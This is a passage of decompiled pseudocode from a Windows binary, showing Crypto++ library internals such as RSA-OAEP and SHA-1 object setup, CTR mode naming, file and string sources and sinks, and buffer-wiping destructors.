// 4BB3D8: using guessed type void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';

//----- (004176D0) --------------------------------------------------------
int __thiscall sub_4176D0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 3) + 4))(this - 3);
}

//----- (004176E0) --------------------------------------------------------
int __thiscall sub_4176E0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 3) + 12))(this - 3);
}

//----- (004176F0) --------------------------------------------------------
int __thiscall sub_4176F0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 4))(this - 2);
}

//----- (00417700) --------------------------------------------------------
int __thiscall sub_417700(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 12))(this - 2);
}

//----- (00417710) --------------------------------------------------------
void __thiscall sub_417710(_DWORD *this)
{
  _DWORD *v2; // eax

  v2 = (_DWORD *)*this;
  if ( *this )
  {
    if ( ((this[2] - (_DWORD)v2) & 0xFFFFFFFC) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_46C87D(v2);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}

//----- (004177A0) --------------------------------------------------------
_DWORD *sub_4177A0()
{
  _DWORD *result; // eax

  result = operator new(4u);
  *result = &CryptoPP::P1363_MGF1::`vftable';
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BA9F8: using guessed type void *CryptoPP::P1363_MGF1::`vftable';

//----- (004177C0) --------------------------------------------------------
_DWORD *sub_4177C0()
{
  _DWORD *v0; // esi
  _DWORD *v1; // ecx
  _DWORD *v2; // ecx

  v0 = operator new(0xC0u);
  memset(v0, 0, 0xC0u);
  sub_435E90(v0, 1);
  v0[1] = 0;
  v0[2] = 0;
  *((_BYTE *)v0 + 81) = 0;
  v0[22] = 0x3FFFFFFF;
  v0[23] = 16;
  if ( *((_BYTE *)v0 + 81) )
  {
    v1 = 0;
  }
  else
  {
    *((_BYTE *)v0 + 81) = 1;
    v1 = v0 + 4;
  }
  v0[24] = v1;
  *((_BYTE *)v0 + 169) = 0;
  v0[44] = 0x3FFFFFFF;
  v0[45] = 16;
  if ( *((_BYTE *)v0 + 169) )
  {
    v2 = 0;
  }
  else
  {
    *((_BYTE *)v0 + 169) = 1;
    v2 = v0 + 26;
  }
  v0[46] = v2;
  sub_45C280((_DWORD *)v0[46]);
  *v0 = &CryptoPP::SHA1::`vftable';
  return v0;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BAA04: using guessed type void *CryptoPP::SHA1::`vftable';

//----- (004178C0) --------------------------------------------------------
int sub_4178C0()
{
  return 20;
}

//----- (004178D0) --------------------------------------------------------
int __thiscall sub_4178D0(void *this, unsigned int a2)
{
  if ( a2 > (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this) )
    return 0;
  else
    return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this);
}

//----- (00417900) --------------------------------------------------------
int __thiscall sub_417900(void *this, int a2)
{
  if ( a2 == (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this) )
    return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
  else
    return 0;
}

//----- (00417930) --------------------------------------------------------
int __thiscall sub_417930(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int v3; // ebx
  unsigned int v4; // edx
  void *v5; // esi
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v8; // [esp+18h] [ebp-1Ch]
  unsigned int v9; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v11; // [esp+30h] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
  v2 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v1 + 16))(v1, v7);
  v11 = 0;
  v3 = sub_440C10(v2);
  v11 = -1;
  v4 = v9;
  v5 = Block;
  if ( v8 < v9 )
    v4 = v8;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return v3;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 417930: using guessed type char var_24[8];

//----- (004179D0) --------------------------------------------------------
int __thiscall sub_4179D0(int *this)
{
  int *v1; // esi
  int v2; // edx
  int v3; // eax
  _DWORD *v4; // eax
  unsigned int v5; // eax
  unsigned int v6; // ebx
  unsigned int v7; // edx
  void *v8; // esi
  char v10[4]; // [esp+10h] [ebp-2Ch] BYREF
  unsigned int v11; // [esp+18h] [ebp-24h]
  unsigned int v12; // [esp+1Ch] [ebp-20h]
  void *Block; // [esp+20h] [ebp-1Ch]
  int (__thiscall *v14)(int, unsigned int); // [esp+28h] [ebp-14h]
  int v15; // [esp+2Ch] [ebp-10h]
  int v16; // [esp+38h] [ebp-4h]

  v1 = this + 2;
  v15 = (*(int (__thiscall **)(int *))(this[2] + 12))(this + 2);
  v2 = *v1;
  v14 = *(int (__thiscall **)(int, unsigned int))(*(_DWORD *)v15 + 8);
  v3 = (*(int (__thiscall **)(int *))(v2 + 4))(v1);
  v4 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 4))(v3, v10);
  v16 = 0;
  v5 = sub_440BD0(v4);
  if ( v5 <= 1 )
    v6 = 0;
  else
    v6 = v5 - 1;
  v16 = -1;
  v7 = v12;
  v8 = Block;
  if ( v11 < v12 )
    v7 = v11;
  memset(Block, 0, 4 * v7);
  if ( v7 )
    j_j_unknown_libname_61(v8);
  else
    j_j___free_base(v8);
  return v14(v15, v6);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4179D0: using guessed type char var_2C[4];

//----- (00417A90) --------------------------------------------------------
int __thiscall sub_417A90(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 4))(v1);
}

//----- (00417AB0) --------------------------------------------------------
int __thiscall sub_417AB0(_DWORD *this, int a2)
{
  (*(void (__cdecl **)(int))(*(_DWORD *)(this[1] + 4) + 12))(a2);
  return a2;
}

//----- (00417B10) --------------------------------------------------------
int __thiscall sub_417B10(_DWORD *this, int a2)
{
  int v2; // ecx
  char *v3; // eax
  char *v4; // eax
  unsigned int v5; // ecx
  void **v6; // eax
  unsigned int v7; // eax
  void *v8; // ecx
  void *v9; // ecx
  void *v10; // ecx
  int v12[5]; // [esp+8h] [ebp-5Ch] BYREF
  unsigned int v13; // [esp+1Ch] [ebp-48h]
  int v14[5]; // [esp+20h] [ebp-44h] BYREF
  unsigned int v15; // [esp+34h] [ebp-30h]
  int v16; // [esp+38h] [ebp-2Ch]
  void *v17[4]; // [esp+3Ch] [ebp-28h] BYREF
  int v18; // [esp+4Ch] [ebp-18h]
  unsigned int v19; // [esp+50h] [ebp-14h]
  unsigned int v20; // [esp+54h] [ebp-10h]
  int v21; // [esp+60h] [ebp-4h]

  v16 = a2;
  v20 = 0;
  v2 = this[1];
  if ( v2 )
  {
    v3 = (char *)(*(int (__thiscall **)(int, int *))(*(_DWORD *)(v2 + 4) + 8))(v2 + 4, v12);
    v21 = 1;
    v20 = 1;
    v4 = (char *)sub_421F20((int)v14, v3, "/");
    v21 = 2;
    v5 = 3;
  }
  else
  {
    v18 = 0;
    v19 = 15;
    LOBYTE(v17[0]) = 0;
    sub_41EF80(v17, byte_4CCC25, 0);
    v4 = (char *)v17;
    v21 = 3;
    v5 = 4;
  }
  v20 = v5;
  v21 = 4;
  v6 = sub_4198A0(v4, "CTR");
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 0;
  *(_OWORD *)a2 = *(_OWORD *)v6;
  *(_QWORD *)(a2 + 16) = *((_QWORD *)v6 + 2);
  v6[4] = 0;
  v6[5] = (void *)15;
  *(_BYTE *)v6 = 0;
  v7 = v20 & 0xFFFFFFD7 | 8;
  v20 = v7;
  v21 = 2;
  if ( (v7 & 4) != 0 )
  {
    v7 &= ~4u;
    v20 = v7;
    if ( v19 >= 0x10 )
    {
      v8 = v17[0];
      if ( v19 + 1 >= 0x1000 )
      {
        v8 = (void *)*((_DWORD *)v17[0] - 1);
        if ( (unsigned int)(v17[0] - v8 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v8);
      v7 = v20;
    }
    v18 = 0;
    v19 = 15;
    LOBYTE(v17[0]) = 0;
  }
  v21 = 1;
  if ( (v7 & 2) != 0 )
  {
    v7 &= ~2u;
    v20 = v7;
    if ( v15 >= 0x10 )
    {
      v9 = (void *)v14[0];
      if ( v15 + 1 >= 0x1000 )
      {
        v9 = *(void **)(v14[0] - 4);
        if ( (unsigned int)(v14[0] - (_DWORD)v9 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v9);
      v7 = v20;
    }
    v14[4] = 0;
    v15 = 15;
    LOBYTE(v14[0]) = 0;
  }
  v21 = 0;
  if ( (v7 & 1) != 0 )
  {
    v20 = v7 & 0xFFFFFFFE;
    if ( v13 >= 0x10 )
    {
      v10 = (void *)v12[0];
      if ( v13 + 1 >= 0x1000 )
      {
        v10 = *(void **)(v12[0] - 4);
        if ( (unsigned int)(v12[0] - (_DWORD)v10 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v10);
    }
    v12[4] = 0;
    v13 = 15;
    LOBYTE(v12[0]) = 0;
  }
  return a2;
}

//----- (00417D60) --------------------------------------------------------
char *__thiscall sub_417D60(char *this)
{
  return this + 28;
}

//----- (00417D70) --------------------------------------------------------
void __thiscall sub_417D70(_DWORD *this)
{
  *this = &off_4BA264;
  this[1] = &off_4BA2B8;
  this[7] = &off_4BA2FC;
  this[12] = &off_4BA334;
  sub_417E70((int)this);
}
// 4BA264: using guessed type int (__stdcall *off_4BA264)(int);
// 4BA2B8: using guessed type void *off_4BA2B8;
// 4BA2FC: using guessed type void *off_4BA2FC;
// 4BA334: using guessed type void *off_4BA334;

//----- (00417DD0) --------------------------------------------------------
int __thiscall sub_417DD0(_DWORD *this, int a2)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 72))(this - 1);
  (*(void (__cdecl **)(int))(*(_DWORD *)v2 + 48))(a2);
  return a2;
}

//----- (00417E30) --------------------------------------------------------
int __thiscall sub_417E30(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 72))(this - 1);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 40))(v1);
}

//----- (00417E50) --------------------------------------------------------
int __thiscall sub_417E50(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 72))(this - 1);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 4))(v1);
}

//----- (00417E60) --------------------------------------------------------
int __thiscall sub_417E60(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 72))(this - 1);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 12))(v1);
}

//----- (00417E70) --------------------------------------------------------
void __thiscall sub_417E70(int this)
{
  unsigned int v2; // edx
  unsigned int v3; // ecx
  void *v4; // edx
  void *v5; // [esp-4h] [ebp-24h]
  void *v6; // [esp-4h] [ebp-24h]

  v5 = *(void **)(this + 64);
  v2 = *(_DWORD *)(this + 52 + (*(_DWORD *)(this + 56) < *(_DWORD *)(this + 60) ? 4 : 8));
  memset(v5, 0, v2);
  if ( v2 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  v6 = *(void **)(this + 44);
  memset(v6, 0, *(_DWORD *)(this + 32 + (*(_DWORD *)(this + 36) < *(_DWORD *)(this + 40) ? 4 : 8)));
  j_j___free_base(v6);
  v3 = *(_DWORD *)(this + 20);
  v4 = *(void **)(this + 24);
  if ( *(_DWORD *)(this + 16) < v3 )
    v3 = *(_DWORD *)(this + 16);
  memset(*(void **)(this + 24), 0, v3);
  j_j___free_base(v4);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00417F40) --------------------------------------------------------
void __thiscall sub_417F40(int this)
{
  unsigned int v2; // ecx
  void *v3; // edx
  void *v4; // [esp-4h] [ebp-20h]

  v4 = *(void **)(this + 44);
  memset(v4, 0, *(_DWORD *)(this + 32 + (*(_DWORD *)(this + 36) < *(_DWORD *)(this + 40) ? 4 : 8)));
  j_j___free_base(v4);
  v2 = *(_DWORD *)(this + 20);
  v3 = *(void **)(this + 24);
  if ( *(_DWORD *)(this + 16) < v2 )
    v2 = *(_DWORD *)(this + 16);
  memset(*(void **)(this + 24), 0, v2);
  j_j___free_base(v3);
}

//----- (00417FD0) --------------------------------------------------------
int __thiscall sub_417FD0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[6] + 60))(this + 6);
}

//----- (00417FE0) --------------------------------------------------------
int __thiscall sub_417FE0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[6] + 56))(this + 6);
}

//----- (00417FF0) --------------------------------------------------------
bool __thiscall sub_417FF0(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 6;
  return !(*(unsigned __int8 (__thiscall **)(_DWORD *))(this[6] + 68))(this + 6)
      && !(*(unsigned __int8 (__thiscall **)(_DWORD *))(*v1 + 100))(v1);
}

//----- (00418020) --------------------------------------------------------
int __thiscall sub_418020(char *this, int a2)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(char *))(*(_DWORD *)this + 168))(this);
  return sub_4389E0(this + 24, v3, (int)&dword_4EEDC0, a2);
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00418050) --------------------------------------------------------
int __thiscall sub_418050(char *this, unsigned int *a2, int a3)
{
  int v4; // eax

  v4 = (*(int (__thiscall **)(char *))(*(_DWORD *)this + 168))(this);
  return sub_438B60(this + 24, v4, a2, (int)&dword_4EEDC0, a3);
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00418080) --------------------------------------------------------
int __thiscall sub_418080(_DWORD *this, int a2, int a3)
{
  _DWORD *v3; // edi
  int (__thiscall *v4)(_DWORD *, int, int, int *, int); // esi
  int v5; // eax

  v3 = this + 6;
  v4 = *(int (__thiscall **)(_DWORD *, int, int, int *, int))(this[6] + 128);
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 168))(this);
  return v4(v3, v5, a2, &dword_4EEDC0, a3);
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (004180B0) --------------------------------------------------------
int __thiscall sub_4180B0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[6] + 32))(this + 6);
}

//----- (004180C0) --------------------------------------------------------
int __thiscall sub_4180C0(int this, int a2)
{
  sub_452860((_DWORD *)this, 0);
  sub_4535B0((_DWORD *)this, a2);
  *(_DWORD *)this = &CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable';
  *(_DWORD *)(this + 4) = &CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable';
  sub_435E90((void *)(this + 24), 0);
  *(_DWORD *)(this + 36) = -1;
  *(_BYTE *)(this + 40) = 0;
  *(_DWORD *)(this + 44) = &CryptoPP::FilterPutSpaceHelper::`vftable';
  *(_DWORD *)(this + 52) = -1;
  *(_DWORD *)(this + 56) = 0;
  *(_DWORD *)(this + 60) = 0;
  *(_DWORD *)(this + 24) = &off_4CF40C;
  *(_DWORD *)(this + 28) = &off_4CF3DC;
  *(_DWORD *)(this + 44) = &off_4CF66C;
  *(_DWORD *)(this + 68) = 0;
  *(_DWORD *)(this + 72) = 0;
  *(_DWORD *)(this + 76) = 0;
  *(_DWORD *)(this + 80) = 0;
  *(_BYTE *)(this + 84) = 0;
  return this;
}
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 4CF3DC: using guessed type void *off_4CF3DC;
// 4CF3FC: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable';
// 4CF40C: using guessed type int (__stdcall *off_4CF40C)(char);
// 4CF66C: using guessed type void *off_4CF66C;
// 4CF694: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable';

//----- (004181B0) --------------------------------------------------------
void __thiscall sub_4181B0(_DWORD *this)
{
  _DWORD *v2; // edi
  int v3; // ecx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  void *v5; // [esp-4h] [ebp-24h]

  *this = &CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable';
  this[1] = &CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable';
  v2 = this + 6;
  v3 = this[17];
  if ( v3 )
    (**(void (__thiscall ***)(int, int))(*(_DWORD *)(*(_DWORD *)v3 + 4) + v3))(*(_DWORD *)(*(_DWORD *)v3 + 4) + v3, 1);
  v2[5] = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v5 = (void *)v2[9];
  memset(v5, 0, *(_DWORD *)((char *)v2 + (v2[7] < v2[8] ? 4 : 8) + 24));
  j_j___free_base(v5);
  v4 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v4 )
    (**v4)(v4, 1);
}
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 4CF3FC: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable';
// 4CF694: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable';

//----- (00418270) --------------------------------------------------------
_DWORD *__thiscall sub_418270(_DWORD *this)
{
  _DWORD *v2; // edi
  void *v3; // ecx
  void *v4; // ebx
  void *v5; // ecx
  void *v6; // ebx

  v2 = operator new(0xC0u);
  memset(v2, 0, 0xC0u);
  v2[1] = this[1];
  v2[2] = this[2];
  *((_BYTE *)v2 + 81) = 0;
  v2[22] = this[22];
  v2[23] = this[23];
  if ( this[23] > 0x10u || *((_BYTE *)v2 + 81) )
  {
    v3 = 0;
  }
  else
  {
    *((_BYTE *)v2 + 81) = 1;
    v3 = v2 + 4;
  }
  v2[24] = v3;
  v4 = (void *)this[24];
  if ( v4 )
    sub_401670(v3, 4 * v2[23], v4, 4 * this[23]);
  *((_BYTE *)v2 + 169) = 0;
  v2[44] = this[44];
  v2[45] = this[45];
  if ( this[45] > 0x10u || *((_BYTE *)v2 + 169) )
  {
    v5 = 0;
  }
  else
  {
    *((_BYTE *)v2 + 169) = 1;
    v5 = v2 + 26;
  }
  v2[46] = v5;
  v6 = (void *)this[46];
  if ( v6 )
    sub_401670(v5, 4 * v2[45], v6, 4 * this[45]);
  *v2 = &CryptoPP::SHA1::`vftable';
  return v2;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BAA04: using guessed type void *CryptoPP::SHA1::`vftable';

//----- (004183A0) --------------------------------------------------------
int __stdcall sub_4183A0(int a1)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  sub_41EF80((void **)a1, "SHA-1", 5u);
  return a1;
}

//----- (00418410) --------------------------------------------------------
int __thiscall sub_418410(_DWORD *this)
{
  return this[24];
}

//----- (00418420) --------------------------------------------------------
int sub_418420()
{
  return 64;
}

//----- (00418430) --------------------------------------------------------
int __thiscall sub_418430(char *this)
{
  char *v1; // ecx
  unsigned int v2; // edx
  char *v3; // edi
  int result; // eax

  v1 = this + 16;
  v2 = *((_DWORD *)v1 + 19);
  v3 = (char *)*((_DWORD *)v1 + 20);
  if ( *((_DWORD *)v1 + 18) < v2 )
    v2 = *((_DWORD *)v1 + 18);
  if ( v3 == v1 )
  {
    v1[65] = 0;
    result = 0;
    memset(v3, 0, 4 * v2);
  }
  return result;
}

//----- (004184A0) --------------------------------------------------------
int __thiscall sub_4184A0(_DWORD *this)
{
  return this[46];
}

//----- (004184B0) --------------------------------------------------------
_DWORD *__thiscall sub_4184B0(_DWORD **this)
{
  return sub_45C280(this[46]);
}

//----- (004184C0) --------------------------------------------------------
__m128i *__thiscall sub_4184C0(int **this, int *a2)
{
  return sub_45F050(this[46], a2);
}

//----- (004184E0) --------------------------------------------------------
int __thiscall sub_4184E0(int this)
{
  int v2; // esi
  int *v3; // ecx
  int result; // eax
  int *v5; // edx
  void *v6; // edi
  int v7; // ecx
  unsigned int v8; // ecx
  void *v9; // edi

  v2 = this + 104;
  v3 = (int *)(this + 176);
  result = *v3;
  v5 = (int *)(v2 + 76);
  v6 = *(void **)(v2 + 80);
  if ( (unsigned int)*v3 < *(_DWORD *)(v2 + 76) )
    v5 = v3;
  v7 = *v5;
  if ( v6 == (void *)v2 )
  {
    result = 0;
    *(_BYTE *)(v2 + 65) = 0;
    memset(v6, 0, 4 * v7);
  }
  v8 = *(_DWORD *)(this + 92);
  v9 = *(void **)(this + 96);
  if ( *(_DWORD *)(this + 88) < v8 )
    v8 = *(_DWORD *)(this + 88);
  if ( v9 == (void *)(this + 16) )
  {
    result = 0;
    *(_BYTE *)(this + 81) = 0;
    memset(v9, 0, 4 * v8);
  }
  return result;
}

//----- (00418580) --------------------------------------------------------
int sub_418580()
{
  return 4;
}

//----- (00418590) --------------------------------------------------------
int __thiscall sub_418590(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
}

//----- (00418600) --------------------------------------------------------
int __thiscall sub_418600(_DWORD *this)
{
  int (__thiscall ***v1)(_DWORD, int); // ecx
  int result; // eax

  *this = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  this[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  v1 = (int (__thiscall ***)(_DWORD, int))this[3];
  if ( v1 )
    return (**v1)(v1, 1);
  return result;
}
// 4BA718: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4BA7EC: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';

//----- (00418660) --------------------------------------------------------
void __noreturn sub_418660()
{
  char pExceptionObject[40]; // [esp+0h] [ebp-28h] BYREF

  sub_41E690(pExceptionObject);
  _CxxThrowException(
    pExceptionObject,
    (_ThrowInfo *)&_TI4_AUInputRejected___InputRejecting_VFilter_CryptoPP___CryptoPP__);
}
// 418660: using guessed type void __noreturn sub_418660();

//----- (00418690) --------------------------------------------------------
char __stdcall sub_418690(int a1, int a2)
{
  return 0;
}

//----- (004186A0) --------------------------------------------------------
int __thiscall sub_4186A0(_DWORD *this, char *a2, size_t a3, int a4, int a5)
{
  const void **v6; // edx
  const void **v7; // ecx
  size_t v8; // esi
  unsigned int v9; // esi
  char *v10; // edx
  char *v11; // eax
  char *v12; // edx

  if ( a3 )
  {
    v6 = (const void **)this[3];
    v7 = v6;
    v8 = (size_t)v6[4];
    if ( a3 < v8 && a3 + v8 > (unsigned int)v6[5] )
    {
      sub_4196B0((void **)v6, 2 * v8);
      v7 = (const void **)this[3];
    }
    v9 = (unsigned int)v7[5];
    v10 = (char *)v7;
    if ( v9 >= 0x10 )
      v10 = (char *)*v7;
    v11 = (char *)v7[4] + (_DWORD)v10;
    v12 = (char *)v7;
    if ( v9 >= 0x10 )
      v12 = (char *)*v7;
    sub_428030(v7, v11 - v12, 0, a2, a3);
  }
  return 0;
}

//----- (00418710) --------------------------------------------------------
int __thiscall sub_418710(void *this, int a2)
{
  int result; // eax
  char pExceptionObject[40]; // [esp+8h] [ebp-4Ch] BYREF
  _DWORD v4[9]; // [esp+30h] [ebp-24h] BYREF

  result = (*(int (__thiscall **)(int, const char *, void ***, int))(*(_DWORD *)a2 + 4))(
             a2,
             "OutputStringPointer",
             &std::string * `RTTI Type Descriptor',
             (int)this + 12);
  if ( !(_BYTE)result )
  {
    sub_419B80((int)v4, "StringSink: OutputStringPointer not specified");
    v4[8] = 0;
    sub_405230(pExceptionObject, v4);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 4ECEC8: using guessed type void **std::string * `RTTI Type Descriptor';

//----- (004187A0) --------------------------------------------------------
_DWORD *__thiscall sub_4187A0(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  sub_435E90(this, 0);
  this[3] = a2;
  result = this;
  *this = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
  this[1] = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
  return result;
}
// 4BA584: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';
// 4BA63C: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';

//----- (004187D0) --------------------------------------------------------
char __thiscall sub_4187D0(void *this, int a2, int a3, int a4, int a5)
{
  int v6; // esi
  char pExceptionObject[40]; // [esp+Ch] [ebp-4Ch] BYREF
  _DWORD v9[9]; // [esp+34h] [ebp-24h] BYREF

  if ( (_BYTE)a3 && !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 192))(this) )
  {
    sub_419B80((int)v9, "Unflushable<T>: this object has buffered input that cannot be flushed");
    v9[8] = 0;
    sub_405460(pExceptionObject, v9);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVCannotFlush_CryptoPP__);
  }
  v6 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
  if ( v6 && a4 )
    return (*(int (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v6 + 148))(v6, a2, a3, a4 - 1, a5);
  else
    return 0;
}

//----- (004188A0) --------------------------------------------------------
int __thiscall sub_4188A0(void *this, int a2, int a3, int a4)
{
  return (*(int (__thiscall **)(void *, int *, int, int, int))(*(_DWORD *)this + 148))(this, &dword_4EEDC0, a2, a3, a4);
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (004188C0) --------------------------------------------------------
void *__thiscall sub_4188C0(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  void *result; // eax
  void *v6; // ecx

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';
  *(_BYTE *)(a2 + 16) = *(_BYTE *)(this + 16);
  *(_DWORD *)(a2 + 20) = *(_DWORD *)(this + 20);
  *(_DWORD *)(a2 + 24) = *(_DWORD *)(this + 24);
  *(_DWORD *)(a2 + 32) = *(_DWORD *)(this + 32);
  *(_DWORD *)(a2 + 36) = *(_DWORD *)(this + 36);
  result = *(void **)(this + 36);
  if ( result )
    result = sub_45AEA0((size_t)result);
  *(_DWORD *)(a2 + 40) = result;
  v6 = *(void **)(this + 40);
  if ( v6 )
    return (void *)sub_401670(result, *(_DWORD *)(a2 + 36), v6, *(_DWORD *)(this + 36));
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4B93B0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';

//----- (004189B0) --------------------------------------------------------
char __thiscall sub_4189B0(unsigned int *this, void *a2, int a3, _DWORD *a4)
{
  size_t v5; // eax
  unsigned int *v6; // edx
  unsigned int v7; // ecx
  void *v8; // esi
  void *v9; // ecx
  unsigned int *v11; // [esp+10h] [ebp-14h]
  size_t v12; // [esp+14h] [ebp-10h]

  if ( __std_type_info_compare(&dword_4ED2C4, &dword_4EE1D8) || (LOBYTE(v5) = sub_43EE60(a3, a4, this + 4), !(_BYTE)v5) )
  {
    sub_4059C0(a2, (int)&CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor', a3);
    v6 = this + 7;
    *(_BYTE *)a4 = *((_BYTE *)this + 16);
    a4[1] = this[5];
    v5 = this[6];
    a4[2] = v5;
    v11 = this + 7;
    if ( a4 + 3 != this + 7 )
    {
      v5 = this[9];
      v7 = a4[5];
      v8 = (void *)a4[6];
      v12 = v5;
      if ( v7 != v5 )
      {
        memset(v8, 0, v7);
        j_j___free_base(v8);
        v5 = v12;
        if ( v12 )
        {
          v8 = sub_45AEA0(v12);
          v5 = v12;
        }
        else
        {
          v8 = 0;
        }
        v6 = v11;
      }
      a4[6] = v8;
      a4[5] = v5;
      a4[4] = -1;
      if ( v8 )
      {
        v9 = (void *)v6[3];
        if ( v9 )
          LOBYTE(v5) = sub_401670(v8, v5, v9, v6[2]);
      }
    }
    a4[4] = -1;
  }
  return v5;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4ED2C4: using guessed type int dword_4ED2C4;
// 4EE1D8: using guessed type int dword_4EE1D8;

